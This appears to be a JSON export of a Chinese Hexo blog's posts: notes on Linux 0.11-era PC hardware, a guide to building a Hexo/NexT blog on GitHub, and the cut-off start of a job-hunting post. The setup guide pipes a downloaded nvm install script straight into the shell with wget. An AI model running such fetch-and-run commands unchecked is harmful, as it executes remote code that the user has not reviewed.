title=\"BIOS\"></a>BIOS</h2><p>顾名思义,基本的输入/输出系统,存放在ROM中的系统BIOS主要用于计算机开机执行系统各个部分自检,并建立起操作系统要使用的各种配置表,把处理器和系统其余部分初始化到一个已知的状态,且为DOS等系统提供硬件设备接口服务.除此之外Linux操作系统在运行的时候并不适用BIOS中的功能.当计算机系统上电开机或者按下了机箱上的复位按钮时,CPU捕获到信号后把CS寄存器设置为0xF000,段基址被设置为0xFFFF0000,段长度为64K.而EIP寄存器(32位体系)被设置为0xFFF0,因此线性地址计算得到0xFFFFFFF0,这个是写死的.4G空间最后一个64K(以前的8086分段特性)的最后16字节处,一般安排一条JMP跳转指令跳到BIOS代码中64KB范围内的某一条指令开始执行.由于目前PC/AT微机中的BIOS容量大多有1MB-2MB,并存储在FLASH中,因此为了能够执行或者访问BIOS超过64KB范围并且又远远不在0-1M地址空间中的其他BIOS代码或者数据,BIOS程序首先使用一个成为32位大模式技术把数据段寄存器的访问范围设置为4G.此后,BIOS在执行了一系列硬件检测和初始化操作之后,把与原来PC机兼容的64KB BIOS代码和数据复制到内存低端1M末端的64K处,然后跳转到这个地方并且让CPU进入真正的实地址模式工作.如下图,最后BIOS会从硬盘或者其他块启动设备把操作系统引导程序加载在内存0x7c00处(Intel约定),并跳转到这个地方继续执行引导程序.<br><img src=\"/images/Linux_0.11_ROM_BIOS.png\" alt=\"Linux_0.11_ROM_BIOS.png\"></p>\n<h2 id=\"CMOS存储器\"><a href=\"#CMOS存储器\" class=\"headerlink\" title=\"CMOS存储器\"></a>CMOS存储器</h2><p>主要用来存放计算机实时时钟信息和系统硬件配置信息,这部分内存通常和实时时钟芯片做在一块集成块中,CMOS内存的地址空间在基本内存地址空间之外,需要用I/O指令来访问.</p>\n<h1 id=\"控制器和控制卡\"><a href=\"#控制器和控制卡\" class=\"headerlink\" title=\"控制器和控制卡\"></a>控制器和控制卡</h1><h2 id=\"中断控制器\"><a href=\"#中断控制器\" class=\"headerlink\" title=\"中断控制器\"></a>中断控制器</h2><p>IBM PC/AT 80X86兼容微机采两片级联的8259A可编程中断控制芯片组成一个中断控制器,Linux在内核初始化会继续重新对8259A进行编程来使得其符合自身的控制.<br><img src=\"/images/Linux_0.11_interrupt_8259A.png\" alt=\"Linux_0.11_interrupt_8259A.png\"></p>\n<h2 id=\"DMA控制器\"><a href=\"#DMA控制器\" class=\"headerlink\" title=\"DMA控制器\"></a>DMA控制器</h2><p>采用两块Intel 8237芯片具有8个独立通道,对页面寄存器端口,(偏移)地址寄存器端口和数据寄存器端口进行设置来启用数据传送.由于DMA寄存器是8位的,而地址和计数值是16位值,因此各自需要发送两次.</p>\n<h2 id=\"定时-计数器\"><a href=\"#定时-计数器\" class=\"headerlink\" title=\"定时/计数器\"></a>定时/计数器</h2><p>采用Intel 8253/8254来产生精确的计时中断信号,动态内存DRAM刷新电路和主机扬声器音调合成.Linux 0.11对通道0进行设置,使其工作在方式3下,并且每隔10ms发出IRQ0,即内核的工作脉搏,用于定时切换任务及统计系统资源量.</p>\n<h2 id=\"键盘控制器\"><a href=\"#键盘控制器\" class=\"headerlink\" title=\"键盘控制器\"></a>键盘控制器</h2><p>采用类Intel 8042芯片对键盘的接通码和断开嘛进行扫描并计算.通过IRQ1引脚向CPU发出中断请求.根据三套扫描码集确定具体键盘字符.(早期的键盘控制器P21引脚控制CPU A21信号线开启大范围寻址)</p>\n<h2 id=\"串行控制卡\"><a href=\"#串行控制卡\" class=\"headerlink\" title=\"串行控制卡\"></a>串行控制卡</h2><p>PC常用符合RS-232C标准的串行接口,并使用通用异步收发器控制芯片UART组成的串行控制器来处理串行数据的手法工作.</p>\n<h2 id=\"显示控制\"><a href=\"#显示控制\" class=\"headerlink\" title=\"显示控制\"></a>显示控制</h2><p>IBM最早推出的PC机视频系统标准有单色MDA标准和彩色CGA标准以及EGA和VGA标准.以后推出的所有高级显卡(包括现在的AGP显卡)虽然都具有极高的图形处理速度和智能加速处理,但是它们都支持这几种标准.Linux 0.1x操作系统仅仅使用了这几种标准都支持的文本显示方式.</p>\n<h3 id=\"MDA显示标准\"><a href=\"#MDA显示标准\" class=\"headerlink\" title=\"MDA显示标准\"></a>MDA显示标准</h3><p>仅支持黑白两色,并且只支持独有的文本字符显示方式(BIOS显示方式7).屏幕规格80*25(列号x=0..79;行号y=0..24),共可以显示2000字符(难怪在Linux中打开shell默认都是80*25).每个字符还带有1个属性字节,因此显示一屏(一帧)内容需要占据4KB字节.其中偶地址字节存放字符代码(ascll),奇地址存放显示属性.MDA卡配置有8KB显存.在PC机内存寻址范围中占用0xb0000开始的8K空间(0xb0000-0xb2000).如果显示屏行数是video_num_lines=25;列数是video_num_colums=80,那么位于屏幕列行值x,y处的字符和属性在内存中的位置是:<br>字符字节位置 = 0xb0000 + video_num_colums*2*y + x*2;<br>属性字节位置 = 字符字节位置+1;</p>\n<blockquote>\n<p><strong>注意此处坐标系为从屏幕左上角开始往右为x增大,往下为y增大,均不为负值.</strong>  </p>\n</blockquote>\n<p><img src=\"/images/Linux_0.11_MDA_Color.png\" alt=\"Linux_0.11_MDA_Color.png\"></p>\n<h3 id=\"CGA显示标准\"><a href=\"#CGA显示标准\" class=\"headerlink\" title=\"CGA显示标准\"></a>CGA显示标准</h3><p>CGA支持7种彩色和图形显示方式(BIOS显示方式0-6).在80列*25行的文本字符显示方式下,有单色和16色彩色两种显示方式(BIOS显示方式2-3).CGA卡标配有16K显示内存(占用内存地址范围0xb8000-0xbc000),因此可存放4帧信息,同样,在每一帧4K显存中,偶数地址存字符代码,奇数字节存放显示属性.但是在console.c程序中只使用了其中8K显存(0xb8000-0xba000).字符显示属性定义如下:<br><img src=\"/images/Linux_0.11_CGA_Color.png\" alt=\"Linux_0.11_CGA_Color.png\"></p>\n<h3 id=\"EGA-VGA显示标准\"><a href=\"#EGA-VGA显示标准\" class=\"headerlink\" title=\"EGA/VGA显示标准\"></a>EGA/VGA显示标准</h3><p><img src=\"/images/Linux_0.11_EGA_VGA.png\" alt=\"Linux_0.11_EGA_VGA.png\"></p>\n<h2 id=\"软盘和硬盘控制器\"><a href=\"#软盘和硬盘控制器\" class=\"headerlink\" title=\"软盘和硬盘控制器\"></a>软盘和硬盘控制器</h2><p>由于软盘片比较容易遭到损坏(发霉或划伤),因此目前计算机中已经逐渐开始不配置软盘驱动器,取而代之的是用U盘.而硬盘作为相对于比较大容量和每比特信息廉价的外存设备,在PC中仍然大量存在.下面是硬盘的一些工作原理:<br><img src=\"/images/Linux_0.11_hard_disk1.png\" alt=\"Linux_0.11_hard_disk1.png\"><br><img src=\"/images/Linux_0.11_hard_disk2.png\" alt=\"Linux_0.11_hard_disk2.png\"></p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>本章介绍了基于Intel 80X86芯片组的计算机组成结构及各个工作部件的工作原理.便于理解操作系统内核的实现,毕竟软件要根据硬件的框架在铺设的.</p>\n"},{"title":"Hello world","date":"2016-08-16T07:10:22.000Z","_content":"\nHexo and NexT on Github 建博客折腾...\n==============\n\n------   \n> 本来已经搭建好了,后来在知乎上看到了自己以前想解决的问题--->如何保证仓库所有的都同步.因为hexo只会生成网页所需要的部分,并不会将本地仓库所有内容都上传至github,由此再次折腾....为了在Windows上搭建环境看是否能够同步,由此再再次验证...\n\n**参考资料**  \n- [Hexo.io原装教程:https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/ \"Hexo官网\")  \n- [Next主题配置:http://theme-next.iissnan.com/theme-settings.html](http://theme-next.iissnan.com/theme-settings.html \"Next主题\")  \n- [不如的教程:http://ibruce.info/2013/11/22/hexo-your-blog/](http://ibruce.info/2013/11/22/hexo-your-blog/ \"不如的博客\")  \n- [bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/](http://bubkoo.com/2013/12/16/hexo-issure/ \"tags..\")  \n- [新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html](http://www.cnblogs.com/debugzer0/articles/5461804.html \"add tags\")  \n- [双份仓库解决](http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ \"two repository\")  \n- [端口占用问题](http://www.wuliaole.com/post/the_error_met_during_the_installation_of_hexo/#Hexo-g的时候遇到Warn-No-layout \"port busy\")  \n- [主题配置文件同步:https://github.com/iissnan/hexo-theme-next/issues/328](https://github.com/iissnan/hexo-theme-next/issues/328)  \n---\n\n# 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)  \n\n\n**安装Node.js**  \n\tWget:  \n\t`$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh`  \n\t安装完成后，重启终端并执行一下命令：  \n\t`$ nvm install stable`  \n**安装Hexo**  \n\t`$ npm install hexo-cli -g　　#装hexo`   \n**初始化项目并开启服务**(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)\n```bash\n\t$ hexo init username.github.io　#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  \n\t$ cd username.github.io　　　　　　#切换到工作目录   \n\t$ npm install　　　　#npm加载,从远程端加载默认配置文件到本地  \n\t$ hexo g　　　#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  \n\t$ hexo s 　　　#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  \n\t$ hexo d　　　#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  \n    #各种插件\n    npm install hexo-generator-index --save\n\tnpm install hexo-generator-archive --save\n\tnpm install hexo-generator-category --save\n\tnpm install hexo-generator-tag --save\n\tnpm install hexo-server --save\n\tnpm install hexo-deployer-git --save\n\tnpm install hexo-deployer-heroku --save\n\tnpm install hexo-deployer-rsync --save\n\tnpm install hexo-deployer-openshift --save\n\tnpm install hexo-renderer-marked@0.2 --save\n\tnpm install hexo-renderer-stylus@0.2 --save\n\tnpm install hexo-generator-feed@1 --save\n\tnpm install hexo-generator-sitemap@1 --save\n\tnpm install hexo-generator-searchdb --save    #搜索服务\n\tnpm install --save hexo-generator-index\n\tnpm install --save hexo-generator-archive \n\tnpm install --save hexo-generator-tag\n\n```  \n\n> 如果出现生成之后没有看到预期的效果,可尝试`hexo clean; rm -rf .deploy_git; hexo g`来重新生成.如果用多个设备开发应该在每次编辑前应该使用`git pull origin hexo`把远程仓库最新的内容拉下来同步到本地仓库.   \n\n# 配置  \n按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码(以前的配置)   \n![github配置](/images/git.png)   \n# 选择主题  \n我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里[https://hexo.io/themes/index.html](https://hexo.io/themes/index.html \"theme\"),慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.     \n#  编辑和发布  \n参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如`**hexo new page \"tags\"**`等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.  \n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello world\ndate: 2016-08-16 15:10:22\ncategories:\n- study\ntags:\n- Configure\n---\n\nHexo and NexT on Github 建博客折腾...\n==============\n\n------   \n> 本来已经搭建好了,后来在知乎上看到了自己以前想解决的问题--->如何保证仓库所有的都同步.因为hexo只会生成网页所需要的部分,并不会将本地仓库所有内容都上传至github,由此再次折腾....为了在Windows上搭建环境看是否能够同步,由此再再次验证...\n\n**参考资料**  \n- [Hexo.io原装教程:https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/ \"Hexo官网\")  \n- [Next主题配置:http://theme-next.iissnan.com/theme-settings.html](http://theme-next.iissnan.com/theme-settings.html \"Next主题\")  \n- [不如的教程:http://ibruce.info/2013/11/22/hexo-your-blog/](http://ibruce.info/2013/11/22/hexo-your-blog/ \"不如的博客\")  \n- [bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/](http://bubkoo.com/2013/12/16/hexo-issure/ \"tags..\")  \n- [新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html](http://www.cnblogs.com/debugzer0/articles/5461804.html \"add tags\")  \n- [双份仓库解决](http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ \"two repository\")  \n- [端口占用问题](http://www.wuliaole.com/post/the_error_met_during_the_installation_of_hexo/#Hexo-g的时候遇到Warn-No-layout \"port busy\")  \n- [主题配置文件同步:https://github.com/iissnan/hexo-theme-next/issues/328](https://github.com/iissnan/hexo-theme-next/issues/328)  \n---\n\n# 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)  \n\n\n**安装Node.js**  \n\tWget:  \n\t`$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh`  \n\t安装完成后，重启终端并执行一下命令：  \n\t`$ nvm install stable`  \n**安装Hexo**  \n\t`$ npm install hexo-cli -g　　#装hexo`   \n**初始化项目并开启服务**(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)\n```bash\n\t$ hexo init username.github.io　#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  \n\t$ cd username.github.io　　　　　　#切换到工作目录   \n\t$ npm install　　　　#npm加载,从远程端加载默认配置文件到本地  \n\t$ hexo g　　　#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  \n\t$ hexo s 　　　#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  \n\t$ hexo d　　　#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  \n    #各种插件\n    npm install hexo-generator-index --save\n\tnpm install hexo-generator-archive --save\n\tnpm install hexo-generator-category --save\n\tnpm install hexo-generator-tag --save\n\tnpm install hexo-server --save\n\tnpm install hexo-deployer-git --save\n\tnpm install hexo-deployer-heroku --save\n\tnpm install hexo-deployer-rsync --save\n\tnpm install hexo-deployer-openshift --save\n\tnpm install hexo-renderer-marked@0.2 --save\n\tnpm install hexo-renderer-stylus@0.2 --save\n\tnpm install hexo-generator-feed@1 --save\n\tnpm install hexo-generator-sitemap@1 --save\n\tnpm install hexo-generator-searchdb --save    #搜索服务\n\tnpm install --save hexo-generator-index\n\tnpm install --save hexo-generator-archive \n\tnpm install --save hexo-generator-tag\n\n```  \n\n> 如果出现生成之后没有看到预期的效果,可尝试`hexo clean; rm -rf .deploy_git; hexo g`来重新生成.如果用多个设备开发应该在每次编辑前应该使用`git pull origin hexo`把远程仓库最新的内容拉下来同步到本地仓库.   \n\n# 配置  \n按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码(以前的配置)   \n![github配置](/images/git.png)   \n# 选择主题  \n我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里[https://hexo.io/themes/index.html](https://hexo.io/themes/index.html \"theme\"),慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.     \n#  编辑和发布  \n参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如`**hexo new page \"tags\"**`等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.  \n","slug":"hello-world","published":1,"updated":"2016-11-14T06:31:45.262Z","_id":"civhnccum0005g8uazblrmmdc","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Hexo-and-NexT-on-Github-建博客折腾…\"><a href=\"#Hexo-and-NexT-on-Github-建博客折腾…\" class=\"headerlink\" title=\"Hexo and NexT on Github 建博客折腾…\"></a>Hexo and NexT on Github 建博客折腾…</h1><hr>\n<blockquote>\n<p>本来已经搭建好了,后来在知乎上看到了自己以前想解决的问题—&gt;如何保证仓库所有的都同步.因为hexo只会生成网页所需要的部分,并不会将本地仓库所有内容都上传至github,由此再次折腾….为了在Windows上搭建环境看是否能够同步,由此再再次验证…</p>\n</blockquote>\n<p><strong>参考资料</strong>  </p>\n<ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/\" title=\"Hexo官网\" target=\"_blank\" rel=\"external\">Hexo.io原装教程:https://hexo.io/zh-cn/docs/</a>  </li>\n<li><a href=\"http://theme-next.iissnan.com/theme-settings.html\" title=\"Next主题\" target=\"_blank\" rel=\"external\">Next主题配置:http://theme-next.iissnan.com/theme-settings.html</a>  </li>\n<li><a href=\"http://ibruce.info/2013/11/22/hexo-your-blog/\" title=\"不如的博客\" target=\"_blank\" rel=\"external\">不如的教程:http://ibruce.info/2013/11/22/hexo-your-blog/</a>  </li>\n<li><a href=\"http://bubkoo.com/2013/12/16/hexo-issure/\" title=\"tags..\" target=\"_blank\" rel=\"external\">bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/</a>  </li>\n<li><a href=\"http://www.cnblogs.com/debugzer0/articles/5461804.html\" title=\"add tags\" target=\"_blank\" rel=\"external\">新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html</a>  </li>\n<li><a href=\"http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/\" title=\"two repository\" target=\"_blank\" rel=\"external\">双份仓库解决</a>  </li>\n<li><a href=\"http://www.wuliaole.com/post/the_error_met_during_the_installation_of_hexo/#Hexo-g的时候遇到Warn-No-layout\" title=\"port busy\" target=\"_blank\" rel=\"external\">端口占用问题</a>  </li>\n<li><a href=\"https://github.com/iissnan/hexo-theme-next/issues/328\" target=\"_blank\" rel=\"external\">主题配置文件同步:https://github.com/iissnan/hexo-theme-next/issues/328</a>  </li>\n</ul>\n<hr>\n<h1 id=\"装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装\"><a href=\"#装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装\" class=\"headerlink\" title=\"装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)\"></a>装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)</h1><p><strong>安装Node.js</strong><br>    Wget:<br>    <code>$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code><br>    安装完成后，重启终端并执行一下命令：<br>    <code>$ nvm install stable</code><br><strong>安装Hexo</strong><br>    <code>$ npm install hexo-cli -g　　#装hexo</code><br><strong>初始化项目并开启服务</strong>(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)</p>\n<pre><code class=\"bash\">$ hexo init username.github.io　<span class=\"comment\">#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  </span>\n$ <span class=\"built_in\">cd</span> username.github.io　　　　　　<span class=\"comment\">#切换到工作目录   </span>\n$ npm install　　　　<span class=\"comment\">#npm加载,从远程端加载默认配置文件到本地  </span>\n$ hexo g　　　<span class=\"comment\">#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  </span>\n$ hexo s 　　　<span class=\"comment\">#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  </span>\n$ hexo d　　　<span class=\"comment\">#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  </span>\n<span class=\"comment\">#各种插件</span>\nnpm install hexo-generator-index --save\nnpm install hexo-generator-archive --save\nnpm install hexo-generator-category --save\nnpm install hexo-generator-tag --save\nnpm install hexo-server --save\nnpm install hexo-deployer-git --save\nnpm install hexo-deployer-heroku --save\nnpm install hexo-deployer-rsync --save\nnpm install hexo-deployer-openshift --save\nnpm install hexo-renderer-marked@0.2 --save\nnpm install hexo-renderer-stylus@0.2 --save\nnpm install hexo-generator-feed@1 --save\nnpm install hexo-generator-sitemap@1 --save\nnpm install hexo-generator-searchdb --save    <span class=\"comment\">#搜索服务</span>\nnpm install --save hexo-generator-index\nnpm install --save hexo-generator-archive \nnpm install --save hexo-generator-tag\n</code></pre>\n<blockquote>\n<p>如果出现生成之后没有看到预期的效果,可尝试<code>hexo clean; rm -rf .deploy_git; hexo g</code>来重新生成.如果用多个设备开发应该在每次编辑前应该使用<code>git pull origin hexo</code>把远程仓库最新的内容拉下来同步到本地仓库.   </p>\n</blockquote>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码(以前的配置)<br><img src=\"/images/git.png\" alt=\"github配置\">   </p>\n<h1 id=\"选择主题\"><a href=\"#选择主题\" class=\"headerlink\" title=\"选择主题\"></a>选择主题</h1><p>我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里<a href=\"https://hexo.io/themes/index.html\" title=\"theme\" target=\"_blank\" rel=\"external\">https://hexo.io/themes/index.html</a>,慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.     </p>\n<h1 id=\"编辑和发布\"><a href=\"#编辑和发布\" class=\"headerlink\" title=\"编辑和发布\"></a>编辑和发布</h1><p>参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如<code>**hexo new page &quot;tags&quot;**</code>等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.  </p>\n","excerpt":"","more":"<h1 id=\"Hexo-and-NexT-on-Github-建博客折腾…\"><a href=\"#Hexo-and-NexT-on-Github-建博客折腾…\" class=\"headerlink\" title=\"Hexo and NexT on Github 建博客折腾…\"></a>Hexo and NexT on Github 建博客折腾…</h1><hr>\n<blockquote>\n<p>本来已经搭建好了,后来在知乎上看到了自己以前想解决的问题—&gt;如何保证仓库所有的都同步.因为hexo只会生成网页所需要的部分,并不会将本地仓库所有内容都上传至github,由此再次折腾….为了在Windows上搭建环境看是否能够同步,由此再再次验证…</p>\n</blockquote>\n<p><strong>参考资料</strong>  </p>\n<ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/\" title=\"Hexo官网\">Hexo.io原装教程:https://hexo.io/zh-cn/docs/</a>  </li>\n<li><a href=\"http://theme-next.iissnan.com/theme-settings.html\" title=\"Next主题\">Next主题配置:http://theme-next.iissnan.com/theme-settings.html</a>  </li>\n<li><a href=\"http://ibruce.info/2013/11/22/hexo-your-blog/\" title=\"不如的博客\">不如的教程:http://ibruce.info/2013/11/22/hexo-your-blog/</a>  </li>\n<li><a href=\"http://bubkoo.com/2013/12/16/hexo-issure/\" title=\"tags..\">bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/</a>  </li>\n<li><a href=\"http://www.cnblogs.com/debugzer0/articles/5461804.html\" title=\"add tags\">新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html</a>  </li>\n<li><a href=\"http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/\" title=\"two repository\">双份仓库解决</a>  </li>\n<li><a href=\"http://www.wuliaole.com/post/the_error_met_during_the_installation_of_hexo/#Hexo-g的时候遇到Warn-No-layout\" title=\"port busy\">端口占用问题</a>  </li>\n<li><a href=\"https://github.com/iissnan/hexo-theme-next/issues/328\">主题配置文件同步:https://github.com/iissnan/hexo-theme-next/issues/328</a>  </li>\n</ul>\n<hr>\n<h1 id=\"装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装\"><a href=\"#装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装\" class=\"headerlink\" title=\"装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)\"></a>装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)</h1><p><strong>安装Node.js</strong><br>    Wget:<br>    <code>$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code><br>    安装完成后，重启终端并执行一下命令：<br>    <code>$ nvm install stable</code><br><strong>安装Hexo</strong><br>    <code>$ npm install hexo-cli -g　　#装hexo</code><br><strong>初始化项目并开启服务</strong>(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)</p>\n<pre><code class=\"bash\">$ hexo init username.github.io　<span class=\"comment\">#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  </span>\n$ <span class=\"built_in\">cd</span> username.github.io　　　　　　<span class=\"comment\">#切换到工作目录   </span>\n$ npm install　　　　<span class=\"comment\">#npm加载,从远程端加载默认配置文件到本地  </span>\n$ hexo g　　　<span class=\"comment\">#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  </span>\n$ hexo s 　　　<span class=\"comment\">#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  </span>\n$ hexo d　　　<span class=\"comment\">#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  </span>\n<span class=\"comment\">#各种插件</span>\nnpm install hexo-generator-index --save\nnpm install hexo-generator-archive --save\nnpm install hexo-generator-category --save\nnpm install hexo-generator-tag --save\nnpm install hexo-server --save\nnpm install hexo-deployer-git --save\nnpm install hexo-deployer-heroku --save\nnpm install hexo-deployer-rsync --save\nnpm install hexo-deployer-openshift --save\nnpm install hexo-renderer-marked@0.2 --save\nnpm install hexo-renderer-stylus@0.2 --save\nnpm install hexo-generator-feed@1 --save\nnpm install hexo-generator-sitemap@1 --save\nnpm install hexo-generator-searchdb --save    <span class=\"comment\">#搜索服务</span>\nnpm install --save hexo-generator-index\nnpm install --save hexo-generator-archive \nnpm install --save hexo-generator-tag\n</code></pre>\n<blockquote>\n<p>如果出现生成之后没有看到预期的效果,可尝试<code>hexo clean; rm -rf .deploy_git; hexo g</code>来重新生成.如果用多个设备开发应该在每次编辑前应该使用<code>git pull origin hexo</code>把远程仓库最新的内容拉下来同步到本地仓库.   </p>\n</blockquote>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码(以前的配置)<br><img src=\"/images/git.png\" alt=\"github配置\">   </p>\n<h1 id=\"选择主题\"><a href=\"#选择主题\" class=\"headerlink\" title=\"选择主题\"></a>选择主题</h1><p>我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里<a href=\"https://hexo.io/themes/index.html\" title=\"theme\">https://hexo.io/themes/index.html</a>,慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.     </p>\n<h1 id=\"编辑和发布\"><a href=\"#编辑和发布\" class=\"headerlink\" title=\"编辑和发布\"></a>编辑和发布</h1><p>参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如<code>**hexo new page &quot;tags&quot;**</code>等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.  </p>\n"},{"title":"求职艰辛路","date":"2016-10-17T08:25:59.000Z","_content":"\n> 经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.\n\n老吴去年心得:[http://www.nephen.com/2015/11/job-summary](http://www.nephen.com/2015/11/job-summary)\n\n----------\n## 个人技术体系\n大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。\n### 为什么选择了嵌入式?\n个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课....好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了*加密与解密*,*Windows 